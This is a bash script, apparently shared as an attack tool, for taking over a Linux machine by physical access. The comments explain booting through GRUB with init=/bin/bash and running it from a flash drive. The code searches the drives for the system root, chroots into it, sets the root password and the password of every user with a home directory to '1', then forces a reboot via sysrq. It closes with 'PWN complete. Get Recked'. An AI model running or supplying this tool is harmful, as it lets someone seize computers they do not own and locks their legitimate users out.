#! /bin/bash

# Sets the root password to 1 and the password of any interactive user to 1

# Must be run as root to function

# Will reboot your system after execution if run as the init process aka without systemd

# To run as the init process press e in the grub bootloader
# Then edit the line that starts with the word linux by appending the following to the end
# init=/bin/bash
# Do not delete anything that was there originally just append the new text
# This will cause your system to boot into bash as root instead of the normal login screen
# From there run
# mount /dev/FlashDriveName /mnt && /mnt/bypass.sh
# where FlashDriveName is the name of the connected flash drive with this script on it

if [[ "$1" != "/rootset" ]]; then
    # Remount current root as writable
    mount -o remount,rw "/" || exit 1

    # Ensure /bypassmnt is an empty directory not mounted to anything
    umount "/bypassmnt" 2>/dev/null
    mkdir -p "/bypassmnt" || exit 1

    echo -e "Searching for linux filesystem root..."
    linuxFound="false"

    # Search each drive in /dev and check if it contains a vmlinuz file
    # if so then mount it to /bypassmnt
    for drive in /dev/sd* /dev/nvme*; do
        mount "$drive" "/bypassmnt" 2>/dev/null || continue
        if [[ -f "/bypassmnt/vmlinuz" ]]; then
            linuxFound="true"
            mount -o remount,rw "/bypassmnt" || exit 1
            echo -e "Found linux filesystem root at $drive"
            break
        fi
        umount "/bypassmnt" 2>/dev/null || continue
    done

    # If all drives were checked and no vmlinuz file could be found then throw an error
    # and advise the user to manually mount the correct root and run again with /rootset
    if [[ "$linuxFound" != "true" ]]; then
        echo -e "Failed to locate linux filesystem root" >&2
        echo -e "Try manually chroot'ing to the correct directory and running again with ./bypass.sh /rootset" >&2
        exit 1
    fi

    # Copy bypass.sh script into /bypassmnt
    # Then chroot to /bypassmnt and run the script again with /rootset
    scriptPath=$(realpath "$BASH_SOURCE" || exit 1)
    cp "$scriptPath" "/bypassmnt/bypass.sh" || exit 1
    chroot "/bypassmnt" "/bin/bash" "/bypass.sh" "/rootset" || exit 1

    # Finally cleanup by removing the copy of bypass.sh
    rm -f "/bypassmnt/bypass.sh" || exit 1

    # If we are running bash from the init process aka without systemd
    # Then use sysrq to restart without a kernel panic
    initProc=$(ps -p 1 -o comm=)
    if [[ "$initProc" != *"systemd"* ]]; then
        echo -e "1" > /proc/sys/kernel/sysrq
        echo -e "b" > /proc/sysrq-trigger
    fi

    exit 0
else
# Set the root users password to 1
    passwd root <<EOF 2>>/dev/null || exit 1
1
1
EOF
    echo -e "Set root password to 1"

    # Loop over all the other users in the /etc/passwd file
    # Set the password of any users with a valid home directory to 1
    while IFS=: read -r username _ uid gid _ home_dir _; do
    if [[ "$home_dir" == /home/* && -d "$home_dir" ]]; then
    passwd $username <<EOF 2>>/dev/null || exit 1
1
1
EOF
    echo -e "Set $username password to 1"
    fi
    done </etc/passwd

    # Print a success message and exit
    echo -e "PWN complete. Get Recked"
    exit 0
fi